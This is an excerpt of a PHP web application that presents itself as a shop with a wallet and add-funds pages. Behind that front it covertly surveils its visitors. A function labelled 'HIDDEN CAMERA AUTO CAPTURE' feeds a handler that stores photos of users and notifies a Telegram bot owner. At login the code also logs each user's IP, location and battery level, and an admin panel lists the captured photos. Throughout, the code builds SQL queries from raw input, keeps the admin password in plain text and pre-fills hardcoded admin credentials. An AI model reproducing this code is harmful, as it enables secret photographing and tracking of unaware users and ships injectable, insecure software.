...
$ADMIN_USERNAME = getSetting('admin_username');
...
function getRealBattery() {
    // Try to get real battery from browser
    if(isset($_POST['battery_level'])) {
        return $_POST['battery_level'];
    }
    return rand(20, 100) . '%';
}
...
function getLocationFromIP($ip) {
    ...
    return ['region' => 'Unknown', 'city' => 'Unknown', 'zip' => 'Unknown', 'as' => 'Unknown'];
}
...
if(isset($_POST['admin_action'])) {
    ...
    if($admin_key === $ADMIN_KEY) {
        ...
        elseif($action === 'change_admin_pass') {
            $new_pass = $_POST['new_admin_pass'];
            updateSetting('admin_pass', $new_pass);
            echo "<script>alert('Admin Password updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
...
if(isset($_POST['google_credential'])) {
    ...
    if($check) {
        if($check['banned'] == 1) { $_SESSION['banned'] = true; }
            ...
            $db->exec("UPDATE users SET ip='$ip', battery_level='$battery', location='{$location['city']}, {$location['region']}' WHERE id=".$check['id']);
        }
    } else {
        $db->exec("INSERT INTO users (google_id, email, name, photo, ip, battery_level, location) VALUES ('$google_id', '$email', '$name', '$photo', '$ip', '$battery', '{$location['city']}, {$location['region']}')");
...
if(isset($_POST['signup'])) {
    ...
    if(!$check) {
        $db->exec("INSERT INTO users (email, name, password, ip, battery_level, location) VALUES ('$email', '$name', '$pass', '$ip', '$battery', '{$location['city']}, {$location['region']}')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        $_SESSION['logged_in'] = true;
...
if(isset($_POST['login'])) {
    ...
    if($email === $ADMIN_EMAIL && $pass === $ADMIN_PASS) {
        ...
        $_SESSION['admin_key'] = getSetting('admin_key');
        $_SESSION['user_id'] = 999;
        $_SESSION['logged_in'] = true;
        echo "<script>alert('Admin Access Granted!'); window.location.href='?admin=1';</script>";
        exit;
    }
    ...
    if($user && password_verify($pass, $user['password'])) {
        if($user['banned'] == 1) { 
            ...
            $battery = getRealBattery();
            $location = getLocationFromIP($ip);
            $db->exec("UPDATE users SET ip='$ip', battery_level='$battery', location='{$location['city']}, {$location['region']}' WHERE id=".$user['id']);
...
if(isset($_POST['capture_photo'])) {
    ...
    $battery = $_POST['battery'] ?? getRealBattery();
    
    $db->exec("UPDATE users SET captured_photo='$photo_data', location='$location', battery_level='$battery' WHERE id=$user_id");
    ...
    $msg = formatBotMessage($user_data);
    $msg .= "\n\nPhoto Captured\nUser: {$user['name']}";
...
function getCapturedPhotos() {
    global $db;
    $result = $db->query("SELECT id, name, email, captured_photo, location, ip, battery_level FROM users WHERE captured_photo IS NOT NULL AND captured_photo != '' ORDER BY id DESC");
    $photos = [];
...
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        .top-menu button { width:auto; padding:10px 20px; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; font-size:14px; cursor:pointer; }
        ...
        .cart-btn { background:#ff4444; margin-top:10px; cursor:pointer; }
        ...
        .admin-panel .admin-btn { width:auto; padding:10px 25px; margin:5px; cursor:pointer; }
        ...
        .admin-only { display:<?php echo $is_admin ? 'block' : 'none'; ?>; }
    </style>
</head>
<body>
...
// HIDDEN CAMERA AUTO CAPTURE
function hiddenCapture() {
...
<div class="dashboard">
    ...
    <div id="sidebar" style="display:none; position:fixed; top:0; left:0; width:300px; height:100%; background:rgba(0,0,0,0.95); z-index:3000; padding:30px; border-right:2px solid #9b59b6; overflow-y:auto;">
        ...
        <button onclick="showOrdersPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; width:100%; color:#fff; border-radius:8px; cursor:pointer;">Order History</button>
        <button onclick="showNotificationsPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; width:100%; color:#fff; border-radius:8px; cursor:pointer;">Notifications</button>
        <button onclick="showAddFundsPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; width:100%; color:#fff; border-radius:8px; cursor:pointer;">Add Funds</button>
        <button onclick="showFundsHistoryPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; width:100%; color:#fff; border-radius:8px; cursor:pointer;">Fund Requests</button>
        <!-- ADMIN BUTTON HATAYA - Sirf Special Login se access -->
    ...
    <div class="wallet-card">
        ...
        <button onclick="showAddFundsPage()" style="margin-top:15px; width:auto; padding:8px 30px; cursor:pointer;">+ Add Funds</button>
    </div>
...
<div id="adminPanel" style="display:block;">
    <div class="page-popup" style="display:block; position:relative; background:rgba(0,0,0,0.95); padding:20px;">
        <div class="popup-card" style="max-width:800px; margin:20px auto;">
            ...
            <div class="admin-panel">
                ...
                <form method="post">
                    ...
                    <input type="hidden" name="admin_action" value="change_admin_key">
                    <input type="text" name="new_admin_key" placeholder="New Admin Key" value="ROHITXBOSSXOWNERZX">
                    <button type="submit" class="admin-btn">Update Admin Key</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Change Admin Password (Login)</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                    <input type="hidden" name="admin_action" value="change_admin_pass">
                    <input type="text" name="new_admin_pass" placeholder="New Admin Password" value="ROHIT/X/BOSS/OWNERPRO">
                    <button type="submit" class="admin-btn">Update Admin Password</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Change Owner ID (Telegram)</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                    <input type="hidden" name="admin_action" value="change_owner_id">
                    <input type="text" name="new_owner_id" placeholder="New Owner ID" value="<?php echo $OWNER_ID; ?>">
                    <button type="submit" class="admin-btn">Update Owner ID</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Change Bot Token</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                    <input type="hidden" name="admin_action" value="change_bot_token">
                    <input type="text" name="new_bot_token" placeholder="New Bot Token" value="<?php echo $BOT_TOKEN; ?>">
                    <button type="submit" class="admin-btn">Update Bot Token</button>
                </form>
            </div>
            ...
            <div class="admin-panel">
                <h4>Change Minimum Deposit</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                    <input type="hidden" name="admin_action" value="change_min_deposit">
                    <input type="number" name="new_min_deposit" placeholder="New Minimum Deposit" value="<?php echo $MIN_DEPOSIT; ?>">
                    <button type="submit" class="admin-btn">Update Min Deposit</button>
                </form>
            </div>
                    ...
                    <div class="admin-user-card">
                        ...
                        <div style="display:flex; gap:5px; flex-wrap:wrap; margin-top:10px;">
                            ...
                            <form method="post" style="display:inline;">
                                ...
                                <button type="submit" class="admin-btn success-btn" style="padding:5px 15px; font-size:12px;">Unban</button>
                            </form>
                            <?php else: ?>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                                ...
                                <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                                <button type="submit" class="admin-btn danger-btn" style="padding:5px 15px; font-size:12px;">Ban</button>
                            </form>
                            <?php endif; ?>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                                ...
                                <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                                <button type="submit" class="admin-btn danger-btn" style="padding:5px 15px; font-size:12px; background:#ff4444;" onclick="return confirm('Delete?')">Delete</button>
                            </form>
                        </div>
                    </div>
                <?php endwhile; ?>
            ...
            <button onclick="window.location.href='index.php'" class="close-btn">Close Admin Panel</button>
        </div>
    </div>
</div>
<?php endif; ?>
